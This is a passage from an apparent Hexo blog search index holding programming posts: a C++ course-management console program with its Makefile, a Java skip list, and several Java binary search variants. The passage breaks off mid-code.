class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">//CMSYS_COURSEMANGER_H</span></span></span><br></pre></td></tr></tbody></table></figure><p></p><p>main.cpp<br></p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;CmdManager.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// &#x4E3B;&#x51FD;&#x6570;</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line"></span><br><span class="line">    <span class="comment">// &#x8F93;&#x5165;&#x7684;&#x547D;&#x4EE4;</span></span><br><span class="line">    <span class="keyword">int</span> cmd;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="comment">// &#x521B;&#x5EFA;&#x547D;&#x4EE4;&#x7BA1;&#x7406;&#x5BF9;&#x8C61;</span></span><br><span class="line">    CmdManager cmdManager;</span><br><span class="line">    cmdManager.Init();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// &#x6253;&#x5370;&#x5E2E;&#x52A9;&#x4FE1;&#x606F;</span></span><br><span class="line">    cmdManager.PrintAllHelp();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;New Command:&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// &#x8FDB;&#x5165;&#x4E3B;&#x5FAA;&#x73AF;&#x5E76;&#x5904;&#x7406;&#x8F93;&#x5165;&#x4FE1;&#x606F;</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; cmd) {</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">cin</span>.good()) {</span><br><span class="line">            <span class="keyword">bool</span> exitCode = cmdManager.HandleCmd((CourseCmd)cmd);</span><br><span class="line">            <span class="keyword">if</span> (!exitCode)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;-------------------------&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;New Command:&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// &#x6E05;&#x7406;&#x8F93;&#x5165;&#x6D41;&#xFF0C;&#x907F;&#x514D;&#x521A;&#x624D;&#x6D41;&#x4E2D;&#x7684;&#x5B57;&#x7B26;&#x5F71;&#x54CD;&#x540E;&#x7EED;&#x8F93;&#x5165;</span></span><br><span class="line">        <span class="built_in">cin</span>.clear();</span><br><span class="line">        <span class="built_in">cin</span>.ignore();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>Makefle<br></p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">CC = g++</span><br><span class="line">CFLAGS = -<span class="built_in">std</span>=c++<span class="number">11</span></span><br><span class="line"></span><br><span class="line">all: main.o CmdManager.o Course.o CourseManager.o</span><br><span class="line">$(CC) $(CFLAGS) main.o CmdManager.o Course.o CourseManager.o -o cmsys</span><br><span class="line"></span><br><span class="line">main.o: main.cpp</span><br><span class="line">$(CC) $(CFLAGS) -c main.cpp</span><br><span class="line"></span><br><span class="line">CmdManager.o: CmdManager.cpp CmdManager.h</span><br><span class="line">$(CC) $(CFLAGS) -c CmdManager.cpp</span><br><span class="line"></span><br><span class="line">CourseManager.o: CourseManager.cpp CourseManager.h</span><br><span class="line">$(CC) $(CFLAGS) -c CourseManager.cpp</span><br><span class="line"></span><br><span class="line">Course.o: Course.cpp Course.h</span><br><span class="line">$(CC) $(CFLAGS) -c Course.cpp</span><br><span class="line"></span><br><span class="line">clean:</span><br><span class="line">rm *.o cmsys</span><br></pre></td></tr></tbody></table></figure><p></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> c++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c++ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Hash Table</title>
      <link href="/2018/10/31/Hash-Table/"/>
      <url>/2018/10/31/Hash-Table/</url>
      
        <content type="html"><![CDATA[<p><img src="http://p4wiqzx0i.bkt.clouddn.com/resize_b1b5da27544870c9376004006387db02.jpg" alt=""></p><a id="more"></a><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Algorithm </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>SkipList</title>
      <link href="/2018/10/30/SkipList/"/>
      <url>/2018/10/30/SkipList/</url>
      
        <content type="html"><![CDATA[<p><img src="http://p4wiqzx0i.bkt.clouddn.com/resize_fe4006ffa877925d4ca389b4531f8a2a.jpg" alt=""></p><a id="more"></a><p><img src="http://p4wiqzx0i.bkt.clouddn.com/%E8%B7%B3%E8%A1%A8.png" alt=""></p><h3 id="Using-Java-realize-SkipList"><a href="#Using-Java-realize-SkipList" class="headerlink" title="Using Java realize SkipList"></a>Using Java realize SkipList</h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> skiplist;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * &#x8DF3;&#x8868;&#x7684;&#x4E00;&#x79CD;&#x5B9E;&#x73B0;&#x65B9;&#x6CD5;&#x3002;</span></span><br><span class="line"><span class="comment"> * &#x8DF3;&#x8868;&#x4E2D;&#x5B58;&#x50A8;&#x7684;&#x662F;&#x6B63;&#x6574;&#x6570;&#xFF0C;&#x5E76;&#x4E14;&#x5B58;&#x50A8;&#x7684;&#x662F;&#x4E0D;&#x91CD;&#x590D;&#x7684;&#x3002;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Author&#xFF1A;ZHENG</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SkipList</span> </span>{</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> MAX_LEVEL = <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> levelCount = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> Node head = <span class="keyword">new</span> Node();  <span class="comment">// &#x5E26;&#x5934;&#x94FE;&#x8868;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> Random r = <span class="keyword">new</span> Random();</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> Node <span class="title">find</span><span class="params">(<span class="keyword">int</span> value)</span> </span>{</span><br><span class="line">    Node p = head;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = levelCount - <span class="number">1</span>; i &gt;= <span class="number">0</span>; --i) {</span><br><span class="line">      <span class="keyword">while</span> (p.forwords[i] != <span class="keyword">null</span> &amp;&amp; p.forwords[i].data &lt; value) {</span><br><span class="line">        p = p.forwords[i];</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (p.forwords[<span class="number">0</span>] != <span class="keyword">null</span> &amp;&amp; p.forwords[<span class="number">0</span>].data == value) {</span><br><span class="line">      <span class="keyword">return</span> p.forwords[<span class="number">0</span>];</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">insert</span><span class="params">(<span class="keyword">int</span> value)</span> </span>{</span><br><span class="line">    <span class="keyword">int</span> level = randomLevel();</span><br><span class="line">    Node newNode = <span class="keyword">new</span> Node();</span><br><span class="line">    newNode.data = value;</span><br><span class="line">    newNode.maxLevel = level;</span><br><span class="line">    Node update[] = <span class="keyword">new</span> Node[level];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; level; ++i) {</span><br><span class="line">      update[i] = head;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    Node p = head;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = level - <span class="number">1</span>; i &gt;= <span class="number">0</span>; --i) {</span><br><span class="line">      <span class="keyword">while</span> (p.forwords[i] != <span class="keyword">null</span> &amp;&amp; p.forwords[i].data &lt; value) {</span><br><span class="line">        p = p.forwords[i];</span><br><span class="line">      }</span><br><span class="line">      update[i] = p;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; level; ++i) {</span><br><span class="line">      newNode.forwords[i] = update[i].forwords[i];</span><br><span class="line">      update[i].forwords[i] = newNode;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (levelCount &lt; level) levelCount = level;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">delete</span><span class="params">(<span class="keyword">int</span> value)</span> </span>{</span><br><span class="line">    Node[] update = <span class="keyword">new</span> Node[levelCount];</span><br><span class="line">    Node p = head;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = levelCount - <span class="number">1</span>; i &gt;= <span class="number">0</span>; --i) {</span><br><span class="line">      <span class="keyword">while</span> (p.forwords[i] != <span class="keyword">null</span> &amp;&amp; p.forwords[i].data &lt; value) {</span><br><span class="line">        p = p.forwords[i];</span><br><span class="line">      }</span><br><span class="line">      update[i] = p;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (p.forwords[<span class="number">0</span>] != <span class="keyword">null</span> &amp;&amp; p.forwords[<span class="number">0</span>].data == value) {</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i = levelCount - <span class="number">1</span>; i &gt;= <span class="number">0</span>; --i) {</span><br><span class="line">        <span class="keyword">if</span> (update[i].forwords[i] != <span class="keyword">null</span> &amp;&amp; update[i].forwords[i].data == value) {</span><br><span class="line">          update[i].forwords[i] = update[i].forwords[i].forwords[i];</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">randomLevel</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="keyword">int</span> level = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; MAX_LEVEL; ++i) {</span><br><span class="line">      <span class="keyword">if</span> (r.nextInt() % <span class="number">2</span> == <span class="number">1</span>) {</span><br><span class="line">        level++;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> level;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">printAll</span><span class="params">()</span> </span>{</span><br><span class="line">    Node p = head;</span><br><span class="line">    <span class="keyword">while</span> (p.forwords[<span class="number">0</span>] != <span class="keyword">null</span>) {</span><br><span class="line">      System.out.print(p.forwords[<span class="number">0</span>] + <span class="string">&quot; &quot;</span>);</span><br><span class="line">      p = p.forwords[<span class="number">0</span>];</span><br><span class="line">    }</span><br><span class="line">    System.out.println();</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Node</span> </span>{</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> data = -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">private</span> Node forwords[] = <span class="keyword">new</span> Node[MAX_LEVEL];</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> maxLevel = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>{</span><br><span class="line">      StringBuilder builder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">      builder.append(<span class="string">&quot;{ data: &quot;</span>);</span><br><span class="line">      builder.append(data);</span><br><span class="line">      builder.append(<span class="string">&quot;; levels: &quot;</span>);</span><br><span class="line">      builder.append(maxLevel);</span><br><span class="line">      builder.append(<span class="string">&quot; }&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> builder.toString();</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Algorithm </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Binary Search</title>
      <link href="/2018/10/30/Binary-Search/"/>
      <url>/2018/10/30/Binary-Search/</url>
      
        <content type="html"><![CDATA[<p><img src="http://p4wiqzx0i.bkt.clouddn.com/resize_ca9c8119a7532fc8a7b249af019bf3df.jpg" alt=""></p><a id="more"></a><p><img src="http://p4wiqzx0i.bkt.clouddn.com/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE.png" alt=""></p><h3 id="Using-recursion-to-realize-Binary-Search"><a href="#Using-recursion-to-realize-Binary-Search" class="headerlink" title="Using recursion to realize Binary Search"></a>Using recursion to realize Binary Search</h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">bsearch</span><span class="params">(<span class="keyword">int</span>[] a, <span class="keyword">int</span> n, <span class="keyword">int</span> value)</span> </span>{</span><br><span class="line">  <span class="keyword">int</span> low = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span> high = n - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (low &lt;= high) {</span><br><span class="line">    <span class="keyword">int</span> mid = (low + high) / <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (a[mid] == value) {</span><br><span class="line">      <span class="keyword">return</span> mid;</span><br><span class="line">    } <span class="keyword">else</span> <span class="keyword">if</span> (a[mid] &lt; value) {</span><br><span class="line">      low = mid + <span class="number">1</span>;</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">      high = mid - <span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="Using-non-recursion-to-realize-Binary-Search"><a href="#Using-non-recursion-to-realize-Binary-Search" class="headerlink" title="Using non-recursion to realize Binary Search"></a>Using non-recursion to realize Binary Search</h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &#x4E8C;&#x5206;&#x67E5;&#x627E;&#x7684;&#x9012;&#x5F52;&#x5B9E;&#x73B0;</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">bsearch</span><span class="params">(<span class="keyword">int</span>[] a, <span class="keyword">int</span> n, <span class="keyword">int</span> val)</span> </span>{</span><br><span class="line">  <span class="keyword">return</span> bsearchInternally(a, <span class="number">0</span>, n - <span class="number">1</span>, val);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">bsearchInternally</span><span class="params">(<span class="keyword">int</span>[] a, <span class="keyword">int</span> low, <span class="keyword">int</span> high, <span class="keyword">int</span> value)</span> </span>{</span><br><span class="line">  <span class="keyword">if</span> (low &gt; high) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> mid =  low + ((high - low) &gt;&gt; <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> (a[mid] == value) {</span><br><span class="line">    <span class="keyword">return</span> mid;</span><br><span class="line">  } <span class="keyword">else</span> <span class="keyword">if</span> (a[mid] &lt; value) {</span><br><span class="line">    <span class="keyword">return</span> bsearchInternally(a, mid+<span class="number">1</span>, high, value);</span><br><span class="line">  } <span class="keyword">else</span> {</span><br><span class="line">    <span class="keyword">return</span> bsearchInternally(a, low, mid-<span class="number">1</span>, value);</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="find-the-first-element-which-equal-to-the-target-number"><a href="#find-the-first-element-which-equal-to-the-target-number" class="headerlink" title="find the first element which equal to the target number"></a>find the first element which equal to the target number</h3><p><strong>clean code</strong><br></p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">bsearch</span><span class="params">(<span class="keyword">int</span>[] a, <span class="keyword">int</span> n, <span class="keyword">int</span> value)</span> </span>{</span><br><span class="line">  <span class="keyword">int</span> low = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span> high = n - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> (low &lt;= high) {</span><br><span class="line">    <span class="keyword">int</span> mid = low + ((high - low) &gt;&gt; <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (a[mid] &gt;= value) {</span><br><span class="line">      high = mid - <span class="number">1</span>;</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">      low = mid + <span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (a[low]==value) <span class="keyword">return</span> low;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>easy understand code</strong><br></p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">bsearch</span><span class="params">(<span class="keyword">int</span>[] a, <span class="keyword">int</span> n, <span class="keyword">int</span> value)</span> </span>{</span><br><span class="line">  <span class="keyword">int</span> low = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span> high = n - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> (low &lt;= high) {</span><br><span class="line">    <span class="keyword">int</span> mid =  low + ((high - low) &gt;&gt; <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (a[mid] &gt; value) {</span><br><span class="line">      high = mid - <span class="number">1</span>;</span><br><span class="line">    } <span class="keyword">else</span> <span class="keyword">if</span> (a[mid] &lt; value) {</span><br><span class="line">      low = mid + <span class="number">1</span>;</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">      <span class="keyword">if</span> ((mid == <span class="number">0</span>) || (a[mid - <span class="number">1</span>] != value)) <span class="keyword">return</span> mid;</span><br><span class="line">      <span class="keyword">else</span> high = mid - <span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="find-the-last-element-which-equal-to-the-target-number"><a href="#find-the-last-element-which-equal-to-the-target-number" class="headerlink" title="find the last element which equal to the target number"></a>find the last element which equal to the target number</h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">bsearch</span><span class="params">(<span class="keyword">int</span>[] a, <span class="keyword">int</span> n, <span class="keyword">int</span> value)</span> </span>{</span><br><span class="line">  <span class="keyword">int</span> low = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span> high = n - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> (low &lt;= high) {</span><br><span class="line">    <span class="keyword">int</span> mid =  low + ((high - low) &gt;&gt; <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (a[mid] &gt; value) {</span><br><span class="line">      high = mid - <span class="number">1</span>;</span><br><span class="line">    } <span class="keyword">else</span> <span class="keyword">if</span> (a[mid] &lt; value) {</span><br><span class="line">      low = mid + <span class="number">1</span>;</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">      <span class="keyword">if</span> ((mid == n - <span class="number">1</span>) || (a[mid + <span class="number">1</span>] != value)) <span class="keyword">return</span> mid;</span><br><span class="line">      <span class="keyword">else</span> low = mid + <span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="find-the-fist-element-which-more-or-equal-to-the-target-number"><a href="#find-the-fist-element-which-more-or-equal-to-the-target-number" class="headerlink" title="find the fist element which more or equal to the target number"></a>find the fist element which more or equal to the target number</h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">bsearch</span><span class="params">(<span class="keyword">int</span>[] a, <span class="keyword">int</span> n, <span class="keyword">int</span> value)</span> </span>{</span><br><span class="line">  <span class="keyword">int</span> low = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span> high = n - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> (low &lt;= high) {</span><br><span class="line">    <span class="keyword">int</span> mid =  low + ((high - low) &gt;&gt; <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (a[mid] &gt;= value) {</span><br><span class="line">      <span class="keyword">if</span> ((mid == <span class="number">0</span>) || (a[mid - <span class="number">1</span>] &lt; value)) <span class="keyword">return</span> mid;</span><br><span class="line">      <span class="keyword">else</span> high = mid - <span class="number">1</span>;</span><br><span class="line">    } <span 